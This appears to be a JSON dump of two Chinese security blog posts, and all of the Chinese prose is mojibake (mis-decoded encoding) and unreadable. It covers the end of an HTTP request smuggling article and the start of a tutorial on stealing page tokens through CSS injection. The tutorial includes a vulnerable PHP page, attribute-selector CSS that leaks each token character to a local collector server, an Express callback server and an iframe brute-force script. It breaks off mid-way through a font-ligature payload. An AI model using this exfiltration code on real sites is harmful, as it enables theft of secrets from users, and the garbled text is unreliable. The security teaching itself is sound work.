ç‰ˆä¿®å¤äº†è¯¥é—®é¢˜ã€‚//æ‚”ä¸å½“åˆåº”è¯¥ææ—©çœ‹ä¸€çœ‹è¿™æ–¹é¢çš„å†…å®¹ï¼Œé”™è¿‡ä¸€ä¸ª CVE /æ‚è„¸\nç„¶åæˆ‘ä»”ç»†çœ‹äº†æœ¬åœ° Golang ç‰ˆæœ¬ 1.8.x \u0026hellip;ç„¶å Caddy çš„ issue é‚®ä»¶å›å¤ä¹Ÿåˆ°äº†\u0026hellip;ä¸å‡ºæ‰€æ–™è®©æˆ‘å‡çº§ Golang åˆ° 1.13.1ï¼Œçœ‹äº†ä¸€çœ¼ dockerhub ä¸Šçš„ caddy æˆ‘åäº†\nä½†æ˜¯ç›®å‰(11/27) dockerhub ä¸Šçš„ caddy ç¯å¢ƒä»ç„¶è¿˜æ˜¯æœ‰è¿™ä¸ªé—®é¢˜çš„ï¼Œä½¿ç”¨éœ€è°¨æ…ï¼\nSomething Else hackerone ä¸Šå·²ç»æœ‰ç›¸å…³æ¼æ´çš„æŠ«éœ²äº†ï¼Œè¿™é‡Œæ¨èå‡ ç¯‡æŒ–æ´å®æˆ˜çš„æ–‡ç« ï¼š\nWrite up of two HTTP Requests Smuggling\nHTTP Request Smuggling (CL.TE)\nHTTP Request Smuggling on vpn.lob.com\nDefence  â€‹\tä»å‰é¢çš„å¤§é‡æ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†HTTPè¯·æ±‚èµ°ç§çš„å±å®³æ€§ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•é˜²å¾¡å‘¢ï¼Ÿä¸é’ˆå¯¹ç‰¹å®šçš„æœåŠ¡å™¨ï¼Œé€šç”¨çš„é˜²å¾¡æªæ–½å¤§æ¦‚æœ‰ä¸‰ç§ã€‚\n ç¦ç”¨ä»£ç†æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨ä¹‹é—´çš„TCPè¿æ¥é‡ç”¨ã€‚ ä½¿ç”¨HTTP/2åè®®ã€‚ å‰åç«¯ä½¿ç”¨ç›¸åŒçš„æœåŠ¡å™¨ã€‚  ä»¥ä¸Šçš„æªæ–½æœ‰çš„ä¸èƒ½ä»æ ¹æœ¬ä¸Šè§£å†³é—®é¢˜ï¼Œè€Œä¸”æœ‰ç€å¾ˆå¤šä¸è¶³ï¼Œå°±æ¯”å¦‚ç¦ç”¨ä»£ç†æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨ä¹‹é—´çš„TCPè¿æ¥é‡ç”¨ï¼Œä¼šå¢å¤§åç«¯æœåŠ¡å™¨çš„å‹åŠ›ã€‚ä½¿ç”¨HTTP/2åœ¨ç°åœ¨çš„ç½‘ç»œæ¡ä»¶ä¸‹æ ¹æœ¬æ— æ³•æ¨å¹¿ä½¿ç”¨ï¼Œå“ªæ€•æ”¯æŒHTTP/2åè®®çš„æœåŠ¡å™¨ä¹Ÿä¼šå…¼å®¹HTTP/1.1ã€‚ä»æœ¬è´¨ä¸Šæ¥è¯´ï¼ŒHTTPè¯·æ±‚èµ°ç§å‡ºç°çš„åŸå› å¹¶ä¸æ˜¯åè®®è®¾è®¡çš„é—®é¢˜ï¼Œè€Œæ˜¯ä¸åŒæœåŠ¡å™¨å®ç°çš„é—®é¢˜ï¼Œä¸ªäººè®¤ä¸ºæœ€å¥½çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯ä¸¥æ ¼çš„å®ç°RFC7230-7235ä¸­æ‰€è§„å®šçš„çš„æ ‡å‡†ï¼Œä½†è¿™ä¹Ÿæ˜¯æœ€éš¾åšåˆ°çš„ã€‚\n ç„¶è€Œæˆ‘å‚è€ƒäº†æ¯”è¾ƒå¤šçš„æ”»å‡»æ–‡ç« ï¼Œå‡æ²¡æœ‰æåˆ°ä¸ºä»€ä¹ˆ HTTP/2 å¯ä»¥é˜²èŒƒ HTTP Smuggling ï¼ŒåŸä½œè€…ä¹Ÿæ˜¯ä¸€å¥è¯å¸¦è¿‡:\n Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.\n ä¹‹åæˆ‘å»æŸ¥è¯¢äº†ä¸€ä¸‹ HTTP/2 ä¸ HTTP/1.1 çš„å·®å¼‚ï¼Œä¸ªäººè®¤ä¸ºä¸»è¦æ˜¯ HTTP/2 ä¸­åŠ å…¥äº† Request multiplexing over a single TCP connection ï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨ HTTP/2 å¯ä»¥ä½¿ç”¨å•ä¸ª TCP è¿æ¥æ¥è¿›è¡Œè¯·æ±‚èµ„æºï¼Œä¹Ÿå°±å‡å°‘äº† TCP è¿æ¥å¤ç”¨çš„å¯èƒ½æ€§ï¼Œå³ä½¿èƒ½ Smuggle ä¹Ÿåªèƒ½æ‰“è‡ªå·±ï¼›è€Œä¸”å¯¹äºæ–°çš„äºŒè¿›åˆ¶åˆ†å¸§æœºåˆ¶å¼•å…¥ä¹Ÿå¯¹è¯¥ç§æ”»å‡»åšå‡ºäº†é™åˆ¶ã€‚\nå…·ä½“å¯ä»¥å‚è€ƒ HTTP/2 ç®€ä»‹\n \nBonus ç»è¿‡è¿™æ®µæ—¶é—´çš„å­¦ä¹ ç ”ç©¶ï¼Œè‡ªå·±ä¹Ÿå°†ä¸€äº›ç›¸å…³çš„å®éªŒæ•´ç†æˆäº† docker ç¯å¢ƒï¼Œæ–¹ä¾¿å¤§å®¶å¤ç°å­¦ä¹ ï¼šHTTP-Smuggling-Lab\nç°åœ¨ç¯å¢ƒä¸å¤šï¼Œæ¬¢è¿ starï¼Œåé¢æˆ‘ä¼šç»§ç»­åŠ å…¥æ›´å¤šçš„ç¯å¢ƒæ–¹ä¾¿å¤§å®¶ä»¥ç™½ç›’çš„å½¢å¼å»ç†è§£å­¦ä¹ ï¼Œå¦‚æœæˆ‘æœ‰æ—¶é—´çš„è¯\nReferences RFC7230\nHTTP Desync Attacks: Request Smuggling Reborn\nHTTP request smuggling\nregilero\u0026rsquo;s blog\nåè®®å±‚çš„æ”»å‡»â€”â€”HTTPè¯·æ±‚èµ°ç§\nhttp request smuggling, cause by obfuscating TE header\nMultiple HTTP Smuggling reports\nHTTP/2: the difference between HTTP/1.1, benefits and how to use it\n","date":"2019-12-05T10:28:11Z","permalink":"https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/","title":"ä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ HTTP Smuggling æ”»å‡»"},{"content":"è¿™æ˜¯æœ¬æ¬¡æ¯”èµ›åšèµ·æ¥æœ€æœ‰è·ªæ„Ÿçš„ä¸€é¢˜äº†ï¼Œå½“æ—¶æ¯”èµ›çš„æ—¶å€™æ€ä¹ˆéƒ½å¼„ä¸å‡ºæ¥\u0026hellip;èµ›åé—®äº†ä¸€ä¸‹ï¼Œä¸»è¦è¿˜æ˜¯å·®äº†ä¸€ç¯‡æ–‡ç«  Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™ï¼Œè¿™ä¸ªæ ‡é¢˜æ˜¯ä¸ªæ³¢å…°è¯­ï¼Œä¸­æ–‡ç¿»è¯‘è¿‡æ¥å°±æ˜¯ä½¿ç”¨ CSS æ”»å‡» Web åº”ç”¨ç¨‹åºï¼Œä»æ–‡ç« å†…å®¹ä¹Ÿçœ‹åˆ°äº† RPO çš„æ”»å‡»å¼•è¿°ï¼Œä¹Ÿæ­£æ˜¯ä¹‹å‰ noxss 2017 çš„è§£æ³•ã€‚\n[TOC]\nPreparation æ‰€åšçš„å®éªŒæµ‹è¯•å‡åœ¨ Chrome 78.0.3904.97 ç‰ˆæœ¬ä¸Šï¼ŒFirefox æœ‰ä¸€äº›åœºæ™¯æœªæµ‹è¯•æˆåŠŸã€‚\næˆ‘ä»¬éœ€è¦çš„æœ‰ fontforge / nodejs / npm|yarn ï¼Œå®‰è£… fontforge on ubuntuï¼Œå®‰è£… nodejs on ubuntu\nINTRO åœ¨æˆ‘ä»¬çœ‹é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ä¸€äº›ç®€åŒ–çš„æƒ…å†µ\né¦–å…ˆåˆ›å»ºä¸€ä¸ª css.php ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php $token1 = md5($_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]); $token2 = md5($token1); ?\u0026gt;\u0026lt;input type=hidden value=\u0026lt;?=$token1 ?\u0026gt;\u0026gt; \u0026lt;script\u0026gt; var TOKEN = \u0026#34;\u0026lt;?=$token2 ?\u0026gt;\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; \u0026lt;?=preg_replace(\u0026#39;#\u0026lt;/style#i\u0026#39;, \u0026#39;#\u0026#39;, $_GET[\u0026#39;css\u0026#39;]) ?\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; è¿™æ®µä»£ç ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œinput æ ‡ç­¾ä¸ script æ ‡ç­¾å†…å‡æœ‰ä¸€ä¸ª token ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¼ å…¥ css å‚æ•°æ¥è·å–è¿™ä¸¤ä¸ª token\nToken1 - Get From Input é¦–å…ˆæˆ‘ä»¬æ¥å°è¯•å»è·å–ç¬¬ä¸€ä¸ª token1 ï¼Œä¹Ÿå°±æ˜¯åœ¨ input æ ‡ç­¾å†…çš„ value å±æ€§å€¼ï¼Œæˆ‘ä»¬å¯æ§çš„åªæœ‰ css å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½å»å°è¯•æ„é€  css æ¥è·å– input æ ‡ç­¾å†…çš„ value å±æ€§å€¼ã€‚\nåœ¨ css å½“ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ css é€‰æ‹©å™¨æ¥é€‰æ‹©æˆ‘ä»¬çš„æ ‡ç­¾å…ƒç´ ï¼Œä¾‹å¦‚\n/* è®¾ç½® body æ ‡ç­¾å…ƒç´  */ body { } /* è®¾ç½® .test class çš„æ ·å¼ */ .test { } /* è®¾ç½® id ä¸º test2 çš„æ ·å¼ */ #test2 { } /* è®¾ç½® value ä¸º abc çš„ input æ ‡ç­¾çš„æ ·å¼ */ input[value=\u0026#34;abc\u0026#34;] { } /* è®¾ç½® value ä¸º a å¼€å¤´çš„ input æ ‡ç­¾çš„æ ·å¼ */ input[value^=\u0026#34;a\u0026#34;] { } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ css é€‰æ‹©å™¨å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®ç±»ä¼¼value^=\u0026quot;a\u0026quot;è¿™æ ·çš„é€‰æ‹©å™¨æ¥è·å–æˆ‘ä»¬çš„å…ƒç´ ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¤§æ¦‚å¯ä»¥æœ‰è¿™ä¹ˆä¸€ä¸ªæ“ä½œ:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;input type=hidden value=\u0026#34;7b8a45b8297cf82cc3cefc174c3ae5a1\u0026#34;\u0026gt; \u0026lt;style\u0026gt; input[value^=\u0026#34;0\u0026#34;] { background: url(http://127.0.0.1:9999/0); } input[value^=\u0026#34;7\u0026#34;] { background: url(http://127.0.0.1:9999/7); } \u0026lt;/style\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  \nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™é‡Œæ”¶åˆ°äº†value^=\u0026quot;7\u0026quot;é€‰æ‹©å™¨å‘æ¥çš„è¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥iä½¿ç”¨æšä¸¾æ€æƒ³æ¥è¿›è¡Œçˆ†ç ´è·å– token1\nToken1 - Auto Get From Input å‰©ä¸‹çš„å°±æ˜¯è¦æ€è€ƒæˆ‘ä»¬è¦å¦‚ä½•å»æ„é€ è‡ªåŠ¨åŒ–å·¥å…·å»è·å–è¿™ä¸ª token1 äº†ï¼Œè¿™é‡Œè‡ªåŠ¨åŒ–çš„éš¾ç‚¹å°±åœ¨äºå¦‚ä½•è·å–çˆ†ç ´çš„æ—¶å€™æ˜¯å“ªä¸ªå­—ç¬¦æ­£ç¡®äº†è€Œå‘èµ·äº†è¯·æ±‚ï¼Œæ— æ³•æ‹¿åˆ°è¿™ä¸ª callback æˆ‘ä»¬ä¹Ÿå°±æ²¡æœ‰ä¾æ®åˆ¤æ–­ç©¶ç«Ÿæ˜¯å“ªä¸ªå­—ç¬¦æ³¨å…¥æ­£ç¡®äº†è€Œå‘èµ·äº†è¯·æ±‚ã€‚\nåŸæ–‡æ˜¯é‡‡å–äº†ä½¿ç”¨ cookie çš„æ–¹å¼æ¥è¿›è¡Œè¿™ä¸ª callback çš„è¿‡ç¨‹ï¼š\n åœ¨æœåŠ¡å™¨ä¸Šæ”¾ç½®ä¸€ä¸ªæœ‰ iframe é¡µé¢ index.html ï¼Œsrc ä¸ºè¦æ³¨å…¥çš„é¡µé¢ css å»ºç«‹ä¸€ä¸ªæœåŠ¡ä¾›æ¥å—æ³¨å…¥å­—ç¬¦å‘æ¥çš„è¯·æ±‚ï¼Œå¹¶ä¸”æœåŠ¡é€šè¿‡è®¾ç½®ä¸€ä¸ª cookie æ¥å“åº”è¿™ä¸ªè¯·æ±‚ index.html æ ¹æ® cookie æ¥è¿›è¡Œåˆ¤æ–­æ³¨å…¥çš„å­—ç¬¦æ˜¯å¦æ­£ç¡®ï¼Œæ­£ç¡®çš„è¯å°±ä½¿ç”¨å˜é‡è¿›è¡Œå­˜å‚¨ç„¶åæ¥ç€ä¸‹ä¸€ä½çš„çˆ†ç ´  æˆ‘ä»¬åœ¨æœåŠ¡ç«¯å°±éœ€è¦æä¾›è¿™ä¹ˆäº›åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ è¿™ä¹ˆä¸ªæœåŠ¡ï¼Œç”¨npm installæˆ–è€…yarnä»¥ä¸‹é¢è¿™ä¸ª package.json æ„å»º\n{ \u0026#34;name\u0026#34;: \u0026#34;css-attack-1\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;express\u0026#34;: \u0026#34;^4.15.5\u0026#34;, \u0026#34;js-cookie\u0026#34;: \u0026#34;^2.1.4\u0026#34; }, \u0026#34;devDependencies\u0026#34;: {}, \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34; } ä»¥åŠç›¸åº”çš„æœåŠ¡ä»£ç ï¼š\nconst express = require(\u0026#39;express\u0026#39;); const app = express(); app.disable(\u0026#39;etag\u0026#39;); const PORT = 3000; app.get(\u0026#39;/token/:token\u0026#39;,(req,res) =\u0026gt; { const { token } = req.params; //var {a} = {a:1, b:2}; =\u0026gt; var obj = {a:1, b:2};var a = obj.a;  console.log(token); res.cookie(\u0026#39;token\u0026#39;,token); res.send(\u0026#39;\u0026#39;) }); app.get(\u0026#39;/cookie.js\u0026#39;,(req,res) =\u0026gt; { res.sendFile(\u0026#39;js.cookie.js\u0026#39;,{ root: \u0026#39;./node_modules/js-cookie/src/\u0026#39; }); }); app.get(\u0026#39;/index.html\u0026#39;,(req,res) =\u0026gt; { res.sendFile(\u0026#39;index.html\u0026#39;,{ root: \u0026#39;.\u0026#39; }); }); app.listen(PORT, () =\u0026gt; { console.log(`Listening on ${PORT}...`); }); ç„¶åä½¿ç”¨node index.jsè·‘èµ·æ¥å°±è¡Œäº†ã€‚\næ•´ä¸ªæµç¨‹å¤§è‡´æ˜¯å¦‚ä¸‹ä¸€ä¸ªæµç¨‹ï¼š\n å¦‚æœæˆ‘ä»¬ç›®å‰æå–çš„ token é•¿åº¦å°äºé¢„æœŸçš„é•¿åº¦ï¼Œåˆ™æˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹æ“ä½œ åˆ é™¤åŒ…å«æ‰€æœ‰å…ˆå‰æå–æ•°æ®çš„ cookie åˆ›å»ºä¸€ä¸ª iframe æ ‡ç­¾ï¼Œå¹¶ src æŒ‡å‘æˆ‘ä»¬æ„é€ å¥½çš„å­—ç¬¦çˆ†ç ´çš„é¡µé¢ã€‚ æˆ‘ä»¬ä¸€ç›´ç­‰åˆ°è‡ªå·±çš„æœåŠ¡ callback ä¸ºçˆ†ç ´è¯·æ±‚è®¾ç½®å«æœ‰ token çš„ cookie è®¾ç½® cookie åï¼Œæˆ‘ä»¬å°†å…¶è®¾ç½®ä¸ºå½“å‰çš„å·²çŸ¥ token å€¼ï¼Œå¹¶è¿”å›åˆ°æ­¥éª¤1  æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æœ‰å¤§è‡´ä»¥ä¸‹æ¡†æ¶ï¼š\n\u0026lt;big id=token\u0026gt;\u0026lt;/big\u0026gt;\u0026lt;br\u0026gt; \u0026lt;iframe id=iframe\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;script\u0026gt; (async function () { const EXPECTED_TOKEN_LENGTH = 32; const ALPHABET = Array.from(\u0026#34;0123456789abcdef\u0026#34;); const iframe = document.getElementById(\u0026#39;iframe\u0026#39;); let extractedToken = \u0026#39;\u0026#39;; while (extractedToken.length \u0026lt; EXPECTED_TOKEN_LENGTH) { clearTokenCookie(); createIframeWithCss(); extractedToken = await getTokenFromCookie(); document.getElementById(\u0026#39;token\u0026#39;).textContent = extractedToken; } })(); \u0026lt;/script\u0026gt; é¦–å…ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ js-cookie è¿™ä¸ªé¡¹ç›®æ¥ç›´æ¥æ¸…é™¤ cookie\nfunction clearTokenCookie() { Cookies.remove(\u0026#39;token\u0026#39;); } æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦ä¸º iframe æ ‡ç­¾æ„é€ æ³¨å…¥çš„é¡µé¢ URL :\nfunction createIframeWithCss() { iframe.src = \u0026#39;http://127.0.0.1/css.php?css=\u0026#39; + encodeURIComponent(generateCSS()); } ä»¥åŠç”Ÿæˆ css çš„å‡½æ•°ï¼š\nfunction generateCSS() { let css = \u0026#39;\u0026#39;; for (let char of ALPHABET) { css += `input[value^=\u0026#34;${extractedToken}${char}\u0026#34;] { background: url(http://127.0.0.1:3000/token/${extractedToken}${char}) }`; } return css; } æœ€åæˆ‘ä»¬éœ€è¦å®ç°é€šè¿‡ç­‰å¾…åå‘è¿æ¥æ¥è®¾ç½® cookie ï¼Œç”¨ JS ä¸­çš„ Promise æœºåˆ¶æ¥æ„å»ºå¼‚æ­¥å‡½æ•°ï¼Œæ¯éš”50æ¯«ç§’æ£€æŸ¥ä¸€æ¬¡ cookie æ˜¯å¦å·²è®¾ç½®ï¼Œå¦‚æœå·²è®¾ç½®ï¼Œè¯¥å‡½æ•°å°†ç«‹å³è¿”å›è¯¥å€¼ã€‚\nfunction getTokenFromCookie() { return new Promise(resolve =\u0026gt; { const interval = setInterval(function() { const token = Cookies.get(\u0026#39;token\u0026#39;); if (token) { clearInterval(interval); resolve(token); } }, 50); }); } æœ€åæ•´åˆèµ·æ¥çš„æ”»å‡»æ–¹å¼æ˜¯è¿™æ ·çš„ï¼š\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script src=\u0026#34;http://127.0.0.1:3000/cookie.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;big id=token\u0026gt;\u0026lt;/big\u0026gt;\u0026lt;br\u0026gt; \u0026lt;iframe id=iframe\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;script\u0026gt; (async function () { const EXPECTED_TOKEN_LENGTH = 32; const ALPHABET = Array.from(\u0026#34;0123456789abcdef\u0026#34;); const iframe = document.getElementById(\u0026#39;iframe\u0026#39;); let extractedToken = \u0026#39;\u0026#39;; while (extractedToken.length \u0026lt; EXPECTED_TOKEN_LENGTH) { clearTokenCookie(); createIframeWithCss(); extractedToken = await getTokenFromCookie(); document.getElementById(\u0026#39;token\u0026#39;).textContent = extractedToken; } function getTokenFromCookie() { return new Promise(resolve =\u0026gt; { const interval = setInterval(function () { const token = Cookies.get(\u0026#39;token\u0026#39;); if (token) { clearInterval(interval); resolve(token); } }, 50); }); } function clearTokenCookie() { Cookies.remove(\u0026#39;token\u0026#39;); } function generateCSS() { let css = \u0026#39;\u0026#39;; for (let char of ALPHABET) { css += `input[value^=\u0026#34;${extractedToken}${char}\u0026#34;] { background: url(http://127.0.0.1:3000/token/${extractedToken}${char}) }`; } return css; } function createIframeWithCss() { iframe.src = \u0026#39;http://127.0.0.1/css.php?css=\u0026#39; + encodeURIComponent(generateCSS()); } })(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n \nToken1 - Same Origin è¿™ä¸ªè¿‡ç¨‹éœ€è¦ç†è§£çš„å°±æ˜¯åœ¨å­—ç¬¦æ³¨å…¥çˆ†ç ´æˆåŠŸæ—¶è®¾ç½®çš„ cookie ï¼Œå®ƒéœ€è¦æˆ‘ä»¬ç”¨ iframe src åŒæºçš„åŸŸåæ‰èƒ½æ‹¿åˆ°è¿™ä¸ª cookie ï¼Œå¦åˆ™ä¼šå—åˆ°åŒæºç­–ç•¥çš„é™åˆ¶æ‹¿ä¸åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªç®€å•çš„æµ‹è¯•ï¼š\n\u0026lt;big id=token\u0026gt;\u0026lt;/big\u0026gt;\u0026lt;br\u0026gt; \u0026lt;iframe src=\u0026#34;http://127.0.0.1:3000/token/7\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;script src=\u0026#34;http://127.0.0.1:3000/cookie.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; (async function () { const EXPECTED_TOKEN_LENGTH = 32; const ALPHABET = Array.from(\u0026#34;0123456789abcdef\u0026#34;); const iframe = document.getElementById(\u0026#39;iframe\u0026#39;); let extractedToken = \u0026#39;\u0026#39;; clearTokenCookie(); extractedToken = await getTokenFromCookie(); document.getElementById(\u0026#39;token\u0026#39;).textContent = extractedToken; function getTokenFromCookie() { return new Promise(resolve =\u0026gt; { const interval = setInterval(function () { const token = Cookies.get(\u0026#39;token\u0026#39;); if (token) { clearInterval(interval); resolve(token); } }, 50); }); } function clearTokenCookie() { Cookies.remove(\u0026#39;token\u0026#39;); } })(); \u0026lt;/script\u0026gt; \u0026lt;iframe src=\u0026#34;http://127.0.0.1:3000/token/78\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;  \nè¿™é‡Œzedd.vvæ˜ å°„åˆ°äº† 127.0.0.1 ï¼Œå¯ä»¥çœ‹åˆ°å› ä¸ºä¸åŒæºï¼Œzedd.vvæ˜¯æ‹¿ä¸åˆ° iframe çš„ cookie çš„ï¼Œè€Œé€šè¿‡ 127.0.0.1 è®¿é—® test.html ï¼Œå› ä¸ºæœåŠ¡å¯¹äº cookie çš„è®¾ç½®å­˜åœ¨Path=/ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½åœ¨çˆ¶é¡µé¢ä¹Ÿèƒ½æ‹¿åˆ° iframe å½“ä¸­çš„ cookie\nToken2 - Font ç°åœ¨æˆ‘ä»¬æ¥å°è¯•å»è·å– javascript ä»£ç ä¸­çš„ token2ï¼Œåœ¨å¼€å§‹ä¹‹å‰æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆå«åšè¿å­—ï¼š\n è¿å­—ç®€è¿° è¿å­—é‚£äº›äº‹  ç®€è€Œè¨€ä¹‹ï¼Œå­—ä½“ä¸­çš„è¿å­—æ˜¯è‡³å°‘ä¸¤ä¸ªå…·æœ‰å›¾å½¢è¡¨ç¤ºå½¢å¼çš„å­—ç¬¦çš„åºåˆ—ã€‚æœ€å¸¸è§çš„è¿å­—å¯èƒ½æ˜¯\u0026quot;fi\u0026quot;åºåˆ—ã€‚åœ¨ä¸‹é¢çš„å›¾ç‰‡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ™°åœ°çœ‹åˆ°\u0026quot;f\u0026quot;ä¸\u0026quot;i\u0026quot;ï¼›è€Œåœ¨ç¬¬äºŒè¡Œä¸­ï¼Œæˆ‘ä»¬å¯¹è¿™ä¸¤ä¸ªå­—æ¯çš„é¡ºåºä½¿ç”¨äº†ä¸åŒçš„å­—ä½“è¡¨ç¤º-å­—æ¯\u0026quot;f\u0026quot;çš„é¡¶éƒ¨è¿æ¥åˆ°\u0026quot;i\u0026quot;ä¸Šæ–¹çš„ç‚¹ã€‚è¿™é‡Œæˆ‘ä»¬åº”è¯¥å°†è¿å­—ä¸å­—è·åŒºåˆ«å¼€æ¥ï¼šå­—è·è°ƒæ•´ä»…ç¡®å®šå­—ä½“ä¸­å­—æ¯ä¹‹é—´çš„è·ç¦»ï¼Œè€Œè¿å­—æ˜¯ç»™å®šå­—ç¬¦åºåˆ—çš„å®Œå…¨ç‹¬ç«‹çš„å­—å½¢ï¼ˆå›¾å½¢ç¬¦å·ï¼‰ã€‚\n \næˆ‘ä»¬å¯ä»¥å€ŸåŠ© fontforge æ¥ç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„è¿å­—ï¼Œå› ä¸ºç°ä»£æµè§ˆå™¨å·²ç»ä¸æ”¯æŒ SVG æ ¼å¼çš„å­—ä½“äº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ fontforge å°† SVG æ ¼å¼è½¬æ¢æˆ WOFF æ ¼å¼ï¼Œæˆ‘ä»¬å¯ä»¥å‡†å¤‡ä¸€ä¸ªåä¸º script.fontforge çš„æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n#!/usr/bin/fontforge Open($1) Generate($1:r + \u0026#34;.woff\u0026#34;) æˆ‘ä»¬å¯ä»¥ç”¨fontforge script.fontforge \u0026lt;plik\u0026gt;.svgè¿™ä¸ªå‘½ä»¤æ¥ç”Ÿæˆ woff æ–‡ä»¶ï¼Œä¸‹é¢è¿™æ®µ svg ä»£ç å®šä¹‰äº†ä¸€ç§åå« hack çš„å­—ä½“ï¼ŒåŒ…æ‹¬ a-z 26 ä¸ª0å®½åº¦çš„å­—æ¯ï¼Œä»¥åŠ sekurak è¿™ä¸ªå®½åº¦ä¸º8000çš„è¿å­—ã€‚\n\u0026lt;svg\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;font id=\u0026#34;hack\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;font-face font-family=\u0026#34;hack\u0026#34; units-per-em=\u0026#34;1000\u0026#34; /\u0026gt; \u0026lt;missing-glyph /\u0026gt; \u0026lt;glyph unicode=\u0026#34;a\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;b\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;c\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;d\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;e\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 